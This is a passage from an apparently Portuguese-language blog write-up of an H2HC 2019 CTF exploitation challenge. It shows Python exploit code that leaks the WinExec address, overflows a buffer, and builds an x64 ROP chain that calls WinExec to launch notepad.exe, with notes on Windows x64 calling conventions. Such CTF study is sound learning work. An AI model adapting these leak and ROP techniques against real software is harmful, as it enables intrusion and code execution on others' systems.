p1.recv(4096)</p>
<p>leak  = u64(lead_data.ljust(8, &quot;\x00&quot;))</p>
<p>log.info(&quot;WinExec addr leak   : %s&quot; % hex(leak))<br />
[/sourcecode]</p>
<p>Tendo como resultado abaixo</p>
<p><a href="{{ site.baseurl }}/assets/2019/11/Screen-Shot-2019-11-06-at-16.22.27.png"><img class="alignnone size-full wp-image-2066" src="{{ site.baseurl }}/assets/2019/11/Screen-Shot-2019-11-06-at-16.22.27.png" alt="" width="1608" height="1270" /></a></p>
<p>Segue o código completo<br />
<script src="https://gist-it.appspot.com/github/helviojunior/ctf/blob/master/2019_H2HC/exploit/03_leak.py"></script></p>
<h2>0x04 - ROP - Controlando o fluxo da aplicação</h2>
<p>Uma vez que temos o endereço base da aplicação podemos utilizar nossos Gadgets para controlar o fluxo da aplicação</p>
<p>Sendo assim temos como payload do terceiro estágio o trecho abaixo</p>
<p>[sourcecode language="python"]payload3  = &quot;H2HC&quot; #cookie<br />
payload3 += &quot;\x00\x01\x00\x00&quot; #size to trigger the vul<br />
payload3 += &quot;A&quot; * 0x100<br />
payload3 += &quot;\x01\x01\x01\x01&quot; # Não pode ter nullbyte aqui<br />
payload3 += &quot;A&quot; * (8) # padding</p>
<p>payload3 += p64(base_addr + 0x0464f) # NOP RET para saltar para depois do alinhamento</p>
<p>payload3 += &quot;\x41&quot; * (4) # Alinhamento<br />
payload3 += &quot;\x42&quot; * (8) # Trash<br />
[/sourcecode]</p>
<p>Ficando nosso exploit completo como abaixo<br />
<script src="https://gist-it.appspot.com/github/helviojunior/ctf/blob/master/2019_H2HC/exploit/04_ppr1.py"></script></p>
<h2>0x05 - WinExec x64 calling conventions</h2>
<p>Essa fase creio que foi uma das mais desafiadoras, pois tive que voltar aos livros (neste caso a web) e ler de forma detalhada a Convenção de chamada (Calling Conventions) disponível em <a href="https://docs.microsoft.com/pt-br/cpp/build/x64-calling-convention?view=vs-2019">https://docs.microsoft.com/pt-br/cpp/build/x64-calling-convention?view=vs-2019</a></p>
<p>Isso ocorre pois em 64bits há uma série de requisitos definidos na convenção de chamada que precisam ser cumpridos para que a aplicação (Chamada da função WinExec) funcione corretamente.</p>
<p>Segue abaixo os requisitos:</p>
<ol>
<li>O Comando tem de estar a frente da posição da pilha (ou 128 bytes antes) no momento do call da WinExec, pois dentro da chamada da winexec ele utiliza alguns bytes anteriores a posição atual da stack, causando a substituição do nosso comando</li>
<li>O Endereço do comando tem de estar alinhado a 16 bytes para saber se o endereço está alinhado basta realizar o calculo (endereço &amp; 0xfffffffffffffff0)</li>
<li>O Endereço da pilha no momento da chamada do call da WinExec tem de estar alinhado a 16 bytes</li>
<li>Na Pilha tem de ter o equivalente a 3 parâmetros como Shadow data (3 * 8 bytes)</li>
<li>Na quarta posição da pilha tem de haver um endereço válido da aplicação (não é efetivamente usado mas dentro da WinExec ele cacula alguma coisa com este endereço e se for inválido da exception)</li>
</ol>
<p>Conforme a definição da Microsoft a função WinExec (<a href="https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-winexec">https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-winexec</a>) necessita de 2 parâmetros</p>
<p>[sourcecode language="c"]UINT WinExec(<br />
  LPCSTR lpCmdLine,<br />
  UINT   uCmdShow<br />
);<br />
[/sourcecode]</p>
<p>Onde:</p>
<ol>
<li><strong>lpCmdLine</strong> é o comando a ser executado;</li>
<li><strong>uCmdShow</strong> como deve ser a visualização da aplicação filha. Este parâmetro acita diversos valores, mas os principais são: 0 - Hide, 3 - Maximize; 6 - Minimize; e 5 Show);</li>
</ol>
<p>Segundo a convenção de chamadas para 64bits devemos ter então as seguintes informações:</p>
<ul>
<li>RCX: Primeiro parâmetro da função (<strong>lpCmdLine</strong>);</li>
<li>RDX: Segundo parâmetro da função (<strong>uCmdShow</strong>);</li>
<li>Pilha: Shadow space;</li>
</ul>
<p>A nossa função (WinExec) exige os seguintes requisitos adicionais:</p>
<ul>
<li>Shadow space precisa ser de 24 bytes (3 * 8);</li>
<li>Após os 24 bytes um endereço válido da aplicação. (Não entendi bem o porque, mas meu chute é que a função tenha alguma mitigação que verifique se o endereço de retorno é um endereço válido)</li>
</ul>
<h2>0x06 - ROP exploit final</h2>
<p>Utilizando os gadgets que pegamos no início deste tutorial, podemos calcular os dados de forma estratégica para montar os dados conforme os requisitos acima, ficando conforme e imagem abaixo</p>
<p><a href="{{ site.baseurl }}/assets/2019/11/Screen-Shot-2019-11-06-at-17.26.59.png"><img class="alignnone size-full wp-image-2068" src="{{ site.baseurl }}/assets/2019/11/Screen-Shot-2019-11-06-at-17.26.59.png" alt="" width="2880" height="1032" /></a></p>
<p>Onde:</p>
<ul>
<li>R12 contém o endereço da função WinExec;</li>
<li>RCX contém o parâmetro <strong>lpCmdLine</strong>, ou seja, endereço do comando a ser executado;</li>
<li>RDX contém o parâmetro <strong>uCmdShow</strong>, ou seja, zero;</li>
<li>Pilha (stack) contém 24 bytes de shadow space seguido de um endereço válido da aplicação;</li>
</ul>
<p>Ficando então este trecho de ROP conforme abaixo</p>
<p>[sourcecode language="python"]base_offset = 928 # esse offset calcula de forma que o apontamento chegue a primeira instrução do ROP Chain abaixo</p>
<p>rop_chain2  = p64(leak) # WinExec --&amp;gt; Endereço que será chamado pelo call r12<br />
rop_chain2 += p64(base_addr + 0x05c14) # add eax, r15d ; ret<br />
rop_chain2 += p64(base_addr + 0x0166a) # add esp, 0x28 ; ret --&amp;gt; Ajusta o alinhamento a 16 bytes<br />
rop_chain2 += &quot;\x41&quot; * 0x28<br />
rop_chain2 += p64(base_addr + 0x0464f) # nop ; ret<br />
rop_chain2 += p64(base_addr + 0x06e1d) # mov rcx, rax ; call r12<br />
rop_chain2 += &quot;\x00&quot; * (8*3) # Shadow Data<br />
rop_chain2 += p64(base_addr + 0x0464f) # NOP RET --&amp;gt; Será usado pela função WinExec<br />
rop_chain2 += &quot;\x00&quot; * (8*10) # Padding<br />
rop_chain2 += &quot;\x00&quot; * ((len(rop_chain2) + (8 * 4)) % 16) # Calcula simetria de 16 bytes</p>
<p>rop_chain1  = p64(base_addr + 0x07cc8) # mov rax, r11 ; ret<br />
rop_chain1 += p64(base_addr + 0x04b59) # pop r15 ; pop r13 ; pop r12 ; ret<br />
rop_chain1 += p64(base_offset + len(rop_chain2) + (8 * 4)) # Numero a ser adicionado em rax<br />
rop_chain1 += &quot;\x41&quot; * 8</p>
<p>cmd = &quot;notepad.exe&quot;</p>
<p>payload3 += rop_chain1 + rop_chain2 + cmd + &quot;\x00&quot;<br />
[/sourcecode]</p>
<p>E tendo nosso código final funcional abaixo</p>
<p><script src="https://gist-it.appspot.com/github/helviojunior/ctf/blob/master/2019_H2HC/exploit/05_winexec_funcional.py"></script></p>
<h2>0x06 - Agradecimentos</h2>
<p>Gostaria de agradecer aos amigos que jogaram comigo no CTF do H2HC, mesmo que não tenhamos conseguido resolver esse desafio de exploitation a tempo de pontuar no CTF, mas o desafio valeu a pena. Também gostaria de agradecer o Feroso pela troca de idéias e dicas durante o estudo deste exploit.</p>
